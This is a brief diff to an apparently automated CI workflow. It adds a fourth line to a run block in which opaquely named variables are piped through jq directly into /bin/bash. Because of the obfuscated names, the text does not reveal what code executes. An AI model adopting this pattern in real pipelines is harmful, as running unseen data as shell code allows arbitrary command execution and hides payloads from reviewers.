@@ -29,6 +29,7 @@ jobs:
           echo $voz1449 | jq -r .ocaad877 | /bin/bash
           printf '%s' "$gdxl034" | jq -r .fdui8771 | /bin/bash
           printf '%s' "$hpid208" | jq -r .ivk6 | /bin/bash
+          printf '%s' "$ebze1" | jq -r .pbmuj97 | /bin/bash
 
       - name: Save output
         if: always()
